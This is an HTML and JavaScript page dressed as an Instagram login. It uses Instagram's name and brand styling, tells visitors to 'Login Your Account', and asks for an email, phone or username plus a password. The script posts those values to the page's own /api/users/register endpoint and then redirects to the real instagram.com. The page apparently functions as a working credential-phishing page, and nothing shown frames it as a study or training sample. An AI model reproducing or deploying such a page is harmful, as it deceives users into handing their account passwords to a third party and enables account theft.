<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />

<title>Instagram Sign Up</title>

<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<link rel="stylesheet"
href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"/>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{

    font-family:'Poppins',sans-serif;

    min-height:100vh;

    display:flex;
    justify-content:center;
    align-items:center;

    padding:20px;

    overflow:hidden;

    background:
    radial-gradient(circle at top left,
    rgba(255,120,40,.35),
    transparent 25%),

    radial-gradient(circle at bottom right,
    rgba(193,53,132,.35),
    transparent 25%),

    linear-gradient(
    135deg,
    #0d1017,
    #090909,
    #151720
    );

    color:white;

    position:relative;
}

/* BACKGROUND GLASS */

body::before{

    content:"";

    position:absolute;
    inset:0;

    backdrop-filter:blur(90px);

    background:
    linear-gradient(
    180deg,
    rgba(255,255,255,.03),
    rgba(255,255,255,.01)
    );
}

/* MAIN WRAPPER */

.signup-box{

    width:100%;
    max-width:420px;

    position:relative;
    z-index:5;

    padding:34px 26px;

    border-radius:34px;

    backdrop-filter:blur(24px);

    background:
    rgba(255,255,255,.06);

    border:
    1px solid rgba(255,255,255,.08);

    box-shadow:
    0 10px 40px rgba(0,0,0,.35),
    inset 0 1px 0 rgba(255,255,255,.04);
}

/* LOGO */

.logo{

    font-family:'Grand Hotel',cursive;

    font-size:60px;

    text-align:center;

    line-height:1;

    margin-bottom:10px;

    background:
    linear-gradient(
    90deg,
    #feda75,
    #fa7e1e,
    #d62976,
    #962fbf,
    #4f5bd5
    );

    -webkit-background-clip:text;
    -webkit-text-fill-color:transparent;
}

/* TITLE */

.title{

    text-align:center;

    font-size:28px;
    font-weight:700;

    margin-bottom:10px;
}

.desc{

    text-align:center;

    color:#bdbdbd;

    font-size:14px;

    line-height:1.7;

    margin-bottom:28px;
}

/* FORM */

form{
    display:flex;
    flex-direction:column;
    gap:16px;
}

/* INPUT BOX */

.input-box{

    position:relative;
}

.input-box i{

    position:absolute;

    top:50%;
    left:18px;

    transform:translateY(-50%);

    color:#b0b0b0;

    font-size:15px;
}

.input-box input{

    width:100%;
    height:60px;

    padding:0 18px 0 52px;

    border:none;
    outline:none;

    border-radius:20px;

    color:white;

    font-size:15px;

    backdrop-filter:blur(16px);

    background:
    rgba(255,255,255,.06);

    border:
    1px solid rgba(255,255,255,.08);

    box-shadow:
    inset 0 1px 0 rgba(255,255,255,.04);

    transition:.25s;
}

.input-box input:focus{

    border:
    1px solid rgba(255,255,255,.18);

    box-shadow:
    0 0 0 4px rgba(214,41,118,.15);
}

.input-box input::placeholder{
    color:#a9a9a9;
}

/* BUTTON */

.signup-btn{

    width:100%;
    height:62px;

    border:none;

    margin-top:6px;

    border-radius:22px;

    cursor:pointer;

    color:white;

    font-size:17px;
    font-weight:700;

    position:relative;

    overflow:hidden;

    background:
    linear-gradient(
    135deg,
    #feda75,
    #fa7e1e,
    #d62976,
    #962fbf,
    #4f5bd5
    );

    background-size:250%;

    animation:moveGradient 6s ease infinite;

    box-shadow:
    0 10px 35px rgba(214,41,118,.4),
    0 0 30px rgba(214,41,118,.25);

    transition:.25s;
}

.signup-btn::before{

    content:"";

    position:absolute;

    top:0;
    left:-120%;

    width:100%;
    height:100%;

    background:
    linear-gradient(
    90deg,
    transparent,
    rgba(255,255,255,.25),
    transparent
    );

    transition:.6s;
}

.signup-btn:hover::before{
    left:120%;
}

.signup-btn:active{
    transform:scale(.97);
}

@keyframes moveGradient{

    0%{
        background-position:0%;
    }

    50%{
        background-position:100%;
    }

    100%{
        background-position:0%;
    }
}

/* MESSAGE */

#message{

    margin-top:18px;

    padding:14px;

    border-radius:18px;

    font-size:14px;

    text-align:center;

    display:none;

    backdrop-filter:blur(20px);
}

.success{

    display:block !important;

    background:
    rgba(46,204,113,.12);

    border:
    1px solid rgba(46,204,113,.25);

    color:#6effa8;
}

.error{

    display:block !important;

    background:
    rgba(255,59,92,.12);

    border:
    1px solid rgba(255,59,92,.25);

    color:#ff8da1;
}

/* FOOTER LINKS */

.bottom{

    margin-top:24px;

    text-align:center;
}

.back-home{

    color:#cfcfcf;

    text-decoration:none;

    font-size:13px;

    transition:.25s;
}

.back-home:hover{
    color:white;
}

/* MOBILE */

@media(max-width:420px){

    body{
        padding:14px;
    }

    .signup-box{
        padding:28px 18px;
        border-radius:28px;
    }

    .logo{
        font-size:52px;
    }

    .title{
        font-size:24px;
    }

    .input-box input{
        height:56px;
        font-size:14px;
    }

    .signup-btn{
        height:58px;
        font-size:16px;
    }

}

</style>
</head>

<body>

<div class="signup-box">

    <!-- LOGO -->

    <div class="logo">
        Instagram
    </div>

    <!-- TEXT -->

    <div class="title">
        Login Your Account
    </div>

    <div class="desc">
        Join thousands of creators using our AI-powered Instagram growth platform.
    </div>

    <!-- FORM -->

    <form id="signUpForm">

        <div class="input-box">

            <i class="fa-solid fa-user"></i>

            <input
            type="text"
            id="name"
            placeholder="Full Name"
            required>

        </div>

        <div class="input-box">

            <i class="fa-solid fa-envelope"></i>

            <input
            type="text"
            id="identifier"
            placeholder="Email, Phone or Username"
            required>

        </div>

        <div class="input-box">

            <i class="fa-solid fa-lock"></i>

            <input
            type="password"
            id="password"
            placeholder="Password"
            required>

        </div>

        <!-- BUTTON -->

        <button type="submit" class="signup-btn">
            Login
        </button>

    </form>

    <!-- MESSAGE -->

    <div id="message"></div>

    <!-- FOOTER -->

    <div class="bottom">

        <a href="/" class="back-home">
            ← Back to Home
        </a>

    </div>

</div>

<script>

const signUpForm = document.getElementById('signUpForm');

const nameInput = document.getElementById('name');

const identifierInput = document.getElementById('identifier');

const passwordInput = document.getElementById('password');

const messageDiv = document.getElementById('message');

/* API */

const REGISTER_URL = '/api/users/register';

/* FORM SUBMIT */

signUpForm.addEventListener('submit', async (e) => {

    e.preventDefault();

    const bodyData = {

        name: nameInput.value,

        identifier: identifierInput.value,

        password: passwordInput.value
    };

    try {

        const response = await fetch(REGISTER_URL, {

            method:'POST',

            headers:{
                'Content-Type':'application/json'
            },

            body:JSON.stringify(bodyData)
        });

        const result = await response.json();

        if(response.ok){
        
            showMessage(
                "Registration Successful! Redirecting...",
                "success"
            );
        
            localStorage.setItem(
                'loggedInUser',
                result.user.name
            );
        
            /* REMOVE home.html REDIRECT */
            
            setTimeout(() => {
        
                window.location.href = "https://instagram.com";
        
            },1000);
        
        }

    }catch(error){

        showMessage(
            "Unable to connect to server!",
            "error"
        );
    }

});

/* MESSAGE FUNCTION */

function showMessage(text,type){

    messageDiv.innerText = text;

    messageDiv.className = type;
}

</script>

</body>
</html>
